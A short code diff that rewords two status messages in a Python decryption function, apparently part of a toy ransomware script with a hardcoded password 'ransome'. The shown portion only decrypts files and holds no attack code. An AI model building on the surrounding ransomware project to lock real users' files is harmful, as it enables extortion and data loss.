@@ -35,7 +35,7 @@ def get_key():
 def decryption_process(files, key):
     password = input("Enter the password to decrypt the file:")
     if password == "ransome":
-        print("Started decrypting...")
+        print("Decryption started...")
         for file in files:
             with open(file, "rb") as f:
                 content = f.read()
@@ -43,7 +43,7 @@ def decryption_process(files, key):
             with open(file, "wb") as f:
                 f.write(decrypted_content)
                 
-        print("...decrypting complete")
+        print("...decryption complete")
 
 
 # Main function calls
